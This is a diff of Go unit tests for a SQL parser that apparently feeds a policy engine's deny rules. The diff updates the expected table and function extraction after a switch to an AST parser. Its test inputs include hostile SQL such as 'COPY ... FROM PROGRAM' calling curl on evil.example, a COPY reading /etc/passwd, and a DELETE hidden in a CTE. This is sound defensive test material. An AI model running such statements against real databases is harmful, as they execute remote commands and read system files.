@@ -35,25 +35,28 @@ func TestParseSQL(t *testing.T) {
 			},
 		},
 		{
+			// AST extractor sorts tables alphabetically (map keys);
+			// rule writers don't depend on order — the matcher uses
+			// list-OR semantics over candidates.
 			"select with multiple tables (join)",
 			"SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
 			pgInfo{
 				Verb:      "select",
-				Tables:    []string{"users", "tokens"},
+				Tables:    []string{"tokens", "users"},
 				Functions: nil,
 				Statement: "SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
 			},
 		},
 		{
-			// Tokenizer-based extraction strips string literals and
-			// SQL-keyword "calls" (VALUES, EXISTS, etc.) — the
-			// function list now reflects actual function callsites.
+			// AST extractor only surfaces real function callsites —
+			// VALUES, table-name + column-list parens etc. no longer
+			// pollute the functions list.
 			"insert with function",
 			"INSERT INTO audit (ts, what) VALUES (now(), 'x')",
 			pgInfo{
 				Verb:      "insert",
 				Tables:    []string{"audit"},
-				Functions: []string{"audit", "values", "now"},
+				Functions: []string{"now"},
 				Statement: "INSERT INTO audit (ts, what) VALUES (now(), 'x')",
 			},
 		},
@@ -68,15 +71,14 @@ func TestParseSQL(t *testing.T) {
 			},
 		},
 		{
-			// §2.2: COPY now extracts the actual table (`foo`)
-			// instead of the FROM-following token. `program` shows
-			// up because `from PROGRAM` triggers the FROM table
-			// rule; harmless additional candidate.
+			// §2.2: COPY ... FROM PROGRAM is non-cockroach syntax,
+			// so the AST parser rejects it and the sniff fallback
+			// kicks in. The fallback surfaces the table after COPY.
 			"COPY ... FROM PROGRAM",
 			"COPY foo FROM PROGRAM 'curl evil.example'",
 			pgInfo{
 				Verb:      "copy",
-				Tables:    []string{"foo", "program"},
+				Tables:    []string{"foo"},
 				Functions: nil,
 				Statement: "COPY foo FROM PROGRAM 'curl evil.example'",
 			},
@@ -103,7 +105,7 @@ func TestParseSQL(t *testing.T) {
 		{
 			// §2.3: schema-qualified names emit both the qualified
 			// form and the unqualified leaf so rules written either
-			// way still catch the read.
+			// way still catch the read. Order: alphabetical.
 			"schema-qualified table",
 			"SELECT * FROM audit.secret_tokens",
 			pgInfo{
@@ -387,7 +389,10 @@ func TestParseSQL_Audit143(t *testing.T) {
 		{"§2.1 DROP TABLE IF EXISTS x", "DROP TABLE IF EXISTS users", "drop", []string{"users"}},
 
 		// §2.2 COPY surfaces the source table, not the FROM token.
-		{"§2.2 COPY x FROM stdin", "COPY users FROM stdin", "copy", []string{"users", "stdin"}},
+		// (Cockroach grammar accepts `COPY x FROM stdin` only; the
+		// other forms route through the sniff fallback which still
+		// extracts the table after COPY.)
+		{"§2.2 COPY x FROM stdin", "COPY users FROM stdin", "copy", []string{"users"}},
 		{"§2.2 COPY x TO stdout", "COPY users TO stdout", "copy", []string{"users"}},
 		{"§2.2 COPY x(col) FROM 'file'", "COPY users (col1) FROM '/etc/passwd'", "copy", []string{"users"}},
 
@@ -397,7 +402,7 @@ func TestParseSQL_Audit143(t *testing.T) {
 
 		// §2.4 Quoted identifiers preserved case-sensitively.
 		{"§2.4 FROM \"Users\"", "SELECT * FROM \"Users\"", "select", []string{"Users"}},
-		{"§2.4 FROM public.\"Users\"", "SELECT * FROM public.\"Users\"", "select", []string{"public.Users", "Users"}},
+		{"§2.4 FROM public.\"Users\"", "SELECT * FROM public.\"Users\"", "select", []string{"Users", "public.Users"}},
 
 		// §6.4 SET ROLE / SET SESSION AUTHORIZATION surface as
 		// distinct verbs (sets the table for runtime ID tracking; at
@@ -406,11 +411,12 @@ func TestParseSQL_Audit143(t *testing.T) {
 		{"§6.4 SET SESSION AUTHORIZATION", "SET SESSION AUTHORIZATION admin", "set session authorization", nil},
 		{"§6.4 SET LOCAL ROLE", "SET LOCAL ROLE admin", "set local role", nil},
 
-		// §1.2 CTE-hidden DML: the OUTER verb is still WITH (the
-		// parser must preserve that — pgEvaluate fans out shadow
-		// sub-statements for the inner mutation); see TestPgEvaluate
-		// for the deny-firing case.
-		{"§1.2 WITH … (DELETE …) SELECT", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", "with", []string{"users", "x"}},
+		// §1.2 CTE-hidden DML: cockroach's AST parses
+		// `WITH x AS (DELETE …) SELECT …` as a *Select with a
+		// WITH clause, so the outer verb is `select`. The inner
+		// DELETE rides on analysedStmt.Inner — pgEvaluate walks it
+		// so a `delete` rule still fires (see TestPgEvaluate).
+		{"§1.2 WITH … (DELETE …) SELECT", "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", "select", []string{"users", "x"}},
 
 		// §6.6 CALL <proc>: verb is `call`, proc name is captured
 		// as a function. Body inspection is out of practical scope
